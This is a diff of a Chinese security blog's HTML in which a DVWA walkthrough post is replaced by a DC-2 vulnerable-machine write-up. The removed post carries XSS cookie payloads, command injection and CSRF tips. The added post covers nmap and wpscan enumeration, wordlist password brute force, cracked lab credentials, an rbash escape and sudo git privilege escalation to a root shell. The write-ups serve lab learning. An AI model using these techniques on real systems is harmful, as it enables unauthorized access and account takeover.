@@ -19,35 +19,45 @@
   <meta name="author" content="fogpost">
   <meta name="keywords" content="">
   
-    <meta name="description" content="简介说到靶机，那么经典的dvwa靶机肯定不能错过，它是一款非常适合新手入门的靶机，它集成了多种漏洞，并且可以自由选择难度，非常适合新手入门，想玩的话自己搭建就好，我这是在服务器上搭的，用来玩玩 LowBrute Force随便输入后便是这个返回值，说明密码错误我们用抓包软件抓包，然后发送到repeat，yakit的爆破采用的是文件标签，原理是和bp一样的对字典有要求,利用响应的大小来判断正误 co">
+    <meta name="description" content="DC-2今天无所事事，又来搞靶机了，少搞这个，打算搞完DC系列再去加深学习一下，该学习学习eviden师傅的fofa教程了 本机ip ： 192.168.56.135目标ip ： 192.168.56.147 信息收集nmap扫描本地ip，主机发现 -sP，是用于内网主机探测  nmap -sP 192.168.56.135&#x2F;24端口扫描nmap -A -p- 192.168.56.14">
 <meta property="og:type" content="article">
-<meta property="og:title" content="dvwa全解">
-<meta property="og:url" content="https://fogpost.top/2024/11/23/dvwa%E5%85%A8%E8%A7%A3/index.html">
+<meta property="og:title" content="DC-2">
+<meta property="og:url" content="https://fogpost.top/2024/11/28/DC-2/index.html">
 <meta property="og:site_name" content="fogpost&#96;s little blog">
-<meta property="og:description" content="简介说到靶机，那么经典的dvwa靶机肯定不能错过，它是一款非常适合新手入门的靶机，它集成了多种漏洞，并且可以自由选择难度，非常适合新手入门，想玩的话自己搭建就好，我这是在服务器上搭的，用来玩玩 LowBrute Force随便输入后便是这个返回值，说明密码错误我们用抓包软件抓包，然后发送到repeat，yakit的爆破采用的是文件标签，原理是和bp一样的对字典有要求,利用响应的大小来判断正误 co">
+<meta property="og:description" content="DC-2今天无所事事，又来搞靶机了，少搞这个，打算搞完DC系列再去加深学习一下，该学习学习eviden师傅的fofa教程了 本机ip ： 192.168.56.135目标ip ： 192.168.56.147 信息收集nmap扫描本地ip，主机发现 -sP，是用于内网主机探测  nmap -sP 192.168.56.135&#x2F;24端口扫描nmap -A -p- 192.168.56.14">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411231240412.png">
-<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411261753518.png">
-<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411261806101.png">
-<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411261810028.png">
-<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411261811659.png">
-<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411261817959.png">
-<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411261818130.png">
-<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411261824846.png">
-<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411261914977.png">
-<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411261906137.png">
-<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411261914096.png">
-<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411261911735.png">
-<meta property="article:published_time" content="2024-11-23T04:35:02.000Z">
-<meta property="article:modified_time" content="2024-11-26T11:14:52.795Z">
+<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411282257172.png">
+<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411282301709.png">
+<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411282305798.png">
+<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411282308689.png">
+<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411282309300.png">
+<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411282311344.png">
+<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411282312143.png">
+<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411282314018.png">
+<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411282322816.png">
+<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411282324996.png">
+<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411282328174.png">
+<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411282330516.png">
+<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411282330233.png">
+<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411282333534.png">
+<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411282335807.png">
+<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411282337342.png">
+<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411282345295.png">
+<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411282354377.png">
+<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411282341436.png">
+<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411282351395.png">
+<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411282357480.png">
+<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411282359962.png">
+<meta property="article:published_time" content="2024-11-28T14:46:20.000Z">
+<meta property="article:modified_time" content="2024-11-28T16:04:34.000Z">
 <meta property="article:author" content="fogpost">
-<meta property="article:tag" content="dvwa">
+<meta property="article:tag" content="web">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://gitee.com/fogpost/photo/raw/master/202411231240412.png">
+<meta name="twitter:image" content="https://gitee.com/fogpost/photo/raw/master/202411282257172.png">
   
   
   
-  <title>dvwa全解 - fogpost`s little blog</title>
+  <title>DC-2 - fogpost`s little blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -214,7 +224,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="dvwa全解"></span>
+            <span id="subtitle" data-typed-text="DC-2"></span>
           
         </div>
 
@@ -225,8 +235,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-11-23 12:35" pubdate>
-          2024年11月23日 下午
+        <time datetime="2024-11-28 22:46" pubdate>
+          2024年11月28日 晚上
         </time>
       </span>
     
@@ -237,7 +247,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          388 字
+          704 字
         
       </span>
     
@@ -248,7 +258,7 @@
         
         
         
-          4 分钟
+          6 分钟
         
       </span>
     
@@ -285,31 +295,63 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">dvwa全解</h1>
+            <h1 id="seo-header">DC-2</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>说到靶机，那么经典的dvwa靶机肯定不能错过，它是一款非常适合新手入门的靶机，它集成了多种漏洞，并且可以自由选择难度，非常适合新手入门，想玩的话自己搭建就好，我这是在服务器上搭的，用来玩玩</p>
-<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><h3 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h3><p>随便输入后便是这个返回值，说明密码错误<br><img src="https://gitee.com/fogpost/photo/raw/master/202411231240412.png" srcset="/img/loading.gif" lazyload><br>我们用抓包软件抓包，然后发送到repeat，yakit的爆破采用的是文件标签，原理是和bp一样的对字典有要求,利用响应的大小来判断正误<br><img src="https://gitee.com/fogpost/photo/raw/master/202411261753518.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202411261806101.png" srcset="/img/loading.gif" lazyload></p>
-<h3 id="command-injection"><a href="#command-injection" class="headerlink" title="command injection"></a>command injection</h3><p>直接在ip查询后面加入的命令执行，可怕可怕，cat也可以执行<br><img src="https://gitee.com/fogpost/photo/raw/master/202411261810028.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202411261811659.png" srcset="/img/loading.gif" lazyload></p>
-<h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>抓取原来修改密码的报文后在yakit中修改略微，重放便可以修改密码，也可以将网址修改一部分再重放，同样修改成功<br><img src="https://gitee.com/fogpost/photo/raw/master/202411261817959.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202411261818130.png" srcset="/img/loading.gif" lazyload><br>这个过程有个技巧就是长链变短链，利用站长工具即可实现，防止社工时让受击者发现<br><img src="https://gitee.com/fogpost/photo/raw/master/202411261824846.png" srcset="/img/loading.gif" lazyload><br>还可以页面构造</p>
-<h3 id="XSS-DOM"><a href="#XSS-DOM" class="headerlink" title="XSS(DOM)"></a>XSS(DOM)</h3><p>查看页面源码，没有php代码，仅有js代码，我们可以利用js脚本<br><img src="https://gitee.com/fogpost/photo/raw/master/202411261914977.png" srcset="/img/loading.gif" lazyload><br>点击英文发现，存在一个明文网址，我们可以利用这个English来做个文章</p>
+                <h1 id="DC-2"><a href="#DC-2" class="headerlink" title="DC-2"></a>DC-2</h1><p>今天无所事事，又来搞靶机了，少搞这个，打算搞完DC系列再去加深学习一下，该学习学习eviden师傅的fofa教程了</p>
+<p>本机ip ： 192.168.56.135<br>目标ip ： 192.168.56.147</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap扫描本地ip，主机发现 -sP，是用于内网主机探测</p>
 <blockquote>
-<p><a target="_blank" rel="noopener" href="http://110.41.22.24/vulnerabilities/xss_d/?default=English">http://110.41.22.24/vulnerabilities/xss_d/?default=English</a></p>
+<p>nmap -sP 192.168.56.135&#x2F;24<br><img src="https://gitee.com/fogpost/photo/raw/master/202411282257172.png" srcset="/img/loading.gif" lazyload><br>端口扫描<br>nmap -A -p- 192.168.56.147<br>对靶机ip的全端口详细扫描，发现两个应用分别是80和7744端口，http和ssh<br><img src="https://gitee.com/fogpost/photo/raw/master/202411282301709.png" srcset="/img/loading.gif" lazyload></p>
+</blockquote>
+<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><h3 id="修改hosts"><a href="#修改hosts" class="headerlink" title="修改hosts"></a>修改hosts</h3><p>访问对应的web站点，发现了域名跳转，需要我们更改hosts文件，将域名指向靶机ip<br><img src="https://gitee.com/fogpost/photo/raw/master/202411282305798.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>vim &#x2F;etc&#x2F;hosts<br><img src="https://gitee.com/fogpost/photo/raw/master/202411282308689.png" srcset="/img/loading.gif" lazyload><br>再次访问，进入主页面，发现flag，让我们爆破账户<br><img src="https://gitee.com/fogpost/photo/raw/master/202411282309300.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202411282311344.png" srcset="/img/loading.gif" lazyload></p>
+</blockquote>
+<h3 id="wpscan爆破账户"><a href="#wpscan爆破账户" class="headerlink" title="wpscan爆破账户"></a>wpscan爆破账户</h3><p>登录网站后进行指纹识别，可以用whatweb或者wapper<br>，发现是由wordpress搭建的</p>
+<blockquote>
+<p>whatweb 192.168.56.147<br><img src="https://gitee.com/fogpost/photo/raw/master/202411282312143.png" srcset="/img/loading.gif" lazyload><br>进行目录扫描，查找管理员页面,发现后台管理页面<br>dirb <a target="_blank" rel="noopener" href="http://dc-2/">http://dc-2/</a><br><img src="https://gitee.com/fogpost/photo/raw/master/202411282314018.png" srcset="/img/loading.gif" lazyload><br>似乎有个专门的wordpress工具wpscan，使用wpscan进行扫描,常用语句：<br>wpscan –url <a target="_blank" rel="noopener" href="http://dc-2/">http://dc-2</a>  扫描版本<br>wpscan –url <a target="_blank" rel="noopener" href="http://dc-2/">http://dc-2</a> –enumerate t 扫描主题<br>wpscan –url <a target="_blank" rel="noopener" href="http://dc-2/">http://dc-2</a> –enumerate p 扫描插件<br>wpscan –url <a target="_blank" rel="noopener" href="http://dc-2/">http://dc-2</a> –enumerate u 枚举用户  </p>
+</blockquote>
+<p>扫描版本发现版本为4.7.10，并利用wpscan枚举用户<br><img src="https://gitee.com/fogpost/photo/raw/master/202411282322816.png" srcset="/img/loading.gif" lazyload><br>发现三个用户admin，jerry，tom<br><img src="https://gitee.com/fogpost/photo/raw/master/202411282324996.png" srcset="/img/loading.gif" lazyload><br>根据flag1用cewl来生成字典，并进行爆破</p>
+<blockquote>
+<p>cewl <a target="_blank" rel="noopener" href="http://dc-2/">http://dc-2/</a> &gt; 1.txt  生成字典<br> Cewl（Custom Word List Generator）是一个用 Ruby 编写的应用程序，它可以爬取指定 URL 的内容，并根据用户设定的参数和选项，生成自定义的字典文件。这些字典文件可以用于密码猜测、暴力破解等攻击场景，从而提高渗透测试的成功率</p>
 </blockquote>
 <blockquote>
-<p><a target="_blank" rel="noopener" href="http://110.41.22.24/vulnerabilities/xss_d/?default=%5C">http://110.41.22.24/vulnerabilities/xss_d/?default=\</a><script>alert('xss')&lt;/script></p>
+<p>wpscan –url <a target="_blank" rel="noopener" href="http://dc-2/">http://dc-2</a> –passwords 1.txt 爆破密码，发现jerry和tom的密码  </p>
 </blockquote>
-<p><img src="https://gitee.com/fogpost/photo/raw/master/202411261906137.png" srcset="/img/loading.gif" lazyload></p>
-<h3 id="XSS-Reflected"><a href="#XSS-Reflected" class="headerlink" title="XSS(Reflected)"></a>XSS(Reflected)</h3><p>反射式XSS，查看源码，同上只不过这次是在输入框中进行反射<br><img src="https://gitee.com/fogpost/photo/raw/master/202411261914096.png" srcset="/img/loading.gif" lazyload></p>
+<p>jerry&#x2F;adipiscing<br>tom&#x2F;parturient  </p>
+<p><img src="https://gitee.com/fogpost/photo/raw/master/202411282328174.png" srcset="/img/loading.gif" lazyload></p>
+<p>尝试用jerry登录，发现flag2，并提示我们使用ssh登录<br><img src="https://gitee.com/fogpost/photo/raw/master/202411282330516.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202411282330233.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="ssh登录"><a href="#ssh登录" class="headerlink" title="ssh登录"></a>ssh登录</h3><blockquote>
+<p>ssh <a href="mailto:&#x74;&#x6f;&#109;&#64;&#49;&#57;&#50;&#46;&#49;&#54;&#x38;&#46;&#x35;&#x36;&#x2e;&#49;&#52;&#55;">&#x74;&#x6f;&#109;&#64;&#49;&#57;&#50;&#46;&#49;&#54;&#x38;&#46;&#x35;&#x36;&#x2e;&#49;&#52;&#55;</a> -p 7744<br><img src="https://gitee.com/fogpost/photo/raw/master/202411282333534.png" srcset="/img/loading.gif" lazyload><br>成功登录，发现在本地有flag3，但是只有vi可用，这个叫我们提权<br><img src="https://gitee.com/fogpost/photo/raw/master/202411282335807.png" srcset="/img/loading.gif" lazyload></p>
+</blockquote>
+<h3 id="rbash提权"><a href="#rbash提权" class="headerlink" title="rbash提权"></a>rbash提权</h3><p>查看当前权限的软件</p>
+<p><img src="https://gitee.com/fogpost/photo/raw/master/202411282337342.png" srcset="/img/loading.gif" lazyload></p>
+<p>利用echo来绕过rbash</p>
 <blockquote>
-<p>&lt;script>alert('xss')&lt;/script></p>
+<p>拿到jerry用户权限<br>export -p     &#x2F;&#x2F;查看环境变量<br>BASH_CMDS[a]&#x3D;&#x2F;bin&#x2F;sh;a     &#x2F;&#x2F;把&#x2F;bin&#x2F;sh给a<br>&#x2F;bin&#x2F;bash<br>export PATH&#x3D;$PATH:&#x2F;bin&#x2F;     &#x2F;&#x2F;添加环境变量<br>export PATH&#x3D;$PATH:&#x2F;usr&#x2F;bin    &#x2F;&#x2F;添加环境变量</p>
 </blockquote>
-<p>拿cookie</p>
+<p><img src="https://gitee.com/fogpost/photo/raw/master/202411282345295.png" srcset="/img/loading.gif" lazyload></p>
+<p>查看可以使用root权限的命令</p>
 <blockquote>
-<p>&lt;script>alert(document.cookie)&lt;/script><br><img src="https://gitee.com/fogpost/photo/raw/master/202411261911735.png" srcset="/img/loading.gif" lazyload></p>
+<p>find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</p>
 </blockquote>
+<p><img src="https://gitee.com/fogpost/photo/raw/master/202411282354377.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>su jerry 利用su获取jerry的权限，这时密码就可以用了<br>现在就可以越权查看jerry的falg4，提示我们用git提权</p>
+</blockquote>
+<p><img src="https://gitee.com/fogpost/photo/raw/master/202411282341436.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>sudo -l 发现可以用git软件</p>
+</blockquote>
+<p><img src="https://gitee.com/fogpost/photo/raw/master/202411282351395.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>sudo git help status </p>
+</blockquote>
+<p>查看git的命令,在配置页面的命令行输入<br>!&#x2F;bin&#x2F;sh,即可提权<br><img src="https://gitee.com/fogpost/photo/raw/master/202411282357480.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202411282359962.png" srcset="/img/loading.gif" lazyload></p>
+<p>##总结<br>至此已经完成，知识点有比如wpscan的用法，git的提权，rbash的绕过</p>
 
                 
               </div>
@@ -328,7 +370,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="category-chain-item">渗透测试</a>
+  <a href="/categories/%E7%BD%91%E7%BB%9C/" class="category-chain-item">网络</a>
   
   
 
@@ -343,7 +385,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/dvwa/" class="print-no-link">#dvwa</a>
+        <a href="/tags/web/" class="print-no-link">#web</a>
       
     </div>
   
@@ -355,8 +397,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>dvwa全解</div>
-      <div>https://fogpost.top/2024/11/23/dvwa全解/</div>
+      <div>DC-2</div>
+      <div>https://fogpost.top/2024/11/28/DC-2/</div>
     </div>
     <div class="license-meta">
       
@@ -368,7 +410,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2024年11月23日</div>
+          <div>2024年11月28日</div>
         </div>
       
       
@@ -400,9 +442,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/11/24/sqli%E7%BB%83%E4%B9%A0/" title="sqli1-10练习">
+                      <a href="/2024/12/09/sqli10-20/" title="sqli10-20">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">sqli1-10练习</span>
+                        <span class="hidden-mobile">sqli10-20</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -410,8 +452,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/11/21/vulhub%E6%90%AD%E5%BB%BA/" title="vulhub搭建">
-                        <span class="hidden-mobile">vulhub搭建</span>
+                      <a href="/2024/11/27/CVE-2015-5254/" title="CVE-2015-5254">
+                        <span class="hidden-mobile">CVE-2015-5254</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
